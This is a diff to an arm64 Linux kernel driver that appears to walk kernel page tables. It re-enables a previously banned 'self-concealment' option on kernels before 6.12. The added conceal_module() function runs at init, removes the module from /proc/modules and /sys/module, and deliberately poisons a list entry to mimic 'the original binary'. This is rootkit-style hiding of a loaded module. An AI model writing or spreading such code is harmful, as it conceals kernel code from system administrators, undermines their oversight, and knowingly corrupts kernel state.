@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: GPL-2.0
-/* Module entry point. */
+/* Module entry point + legacy self-concealment for kernels before 6.12. */
 
 #include <linux/errno.h>
 #include <linux/init.h>
@@ -7,6 +7,23 @@
 #include <linux/mm.h>
 #include <linux/module.h>
 #include <linux/types.h>
+#include <linux/version.h>
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(6, 12, 0)
+#define DRV_LEGACY_SELF_CONCEAL 1
+#else
+#define DRV_LEGACY_SELF_CONCEAL 0
+#endif
+
+#if !DRV_LEGACY_SELF_CONCEAL && defined(KCFG_HIDE_SELF_MODULE)
+#error "self-concealment must not be enabled on kernel 6.12+"
+#endif
+
+#if DRV_LEGACY_SELF_CONCEAL
+#include <linux/kobject.h>
+#include <linux/list.h>
+#include <linux/poison.h>
+#endif
 
 #include <asm/memory.h>
 #include <asm/page.h>
@@ -22,8 +39,22 @@
 
 struct drv_state drv;
 
-#ifdef KCFG_HIDE_SELF_MODULE
-#error "KCFG_HIDE_SELF_MODULE is unsafe and no longer supported"
+#if DRV_LEGACY_SELF_CONCEAL
+/* Preserve the original driver's self-concealment on the older supported
+ * kernels. This directly mutates loader-owned state and is intentionally
+ * compiled out for 6.12+, where it is unsafe during module finalisation. */
+static void conceal_module(void) {
+	struct module *mod = THIS_MODULE;
+
+	/* Remove the module from /proc/modules and leave its list head valid. */
+	list_del(&mod->list);
+	INIT_LIST_HEAD(&mod->list);
+
+	/* Remove /sys/module/<name>, then reproduce the original binary's second
+	 * list_del() that poisons the detached kobject entry. */
+	kobject_del(&mod->mkobj.kobj);
+	list_del(&mod->mkobj.kobj.entry);
+}
 #endif
 
 /* Initialise drv.m_page_level and drv.m_pgd_va from TCR_EL1 / TTBR1_EL1 — the
@@ -94,6 +125,9 @@ int __init init_driver(void) {
 		return ret;
 	}
 
+#if DRV_LEGACY_SELF_CONCEAL
+	conceal_module();
+#endif
 	return 0;
 }
 
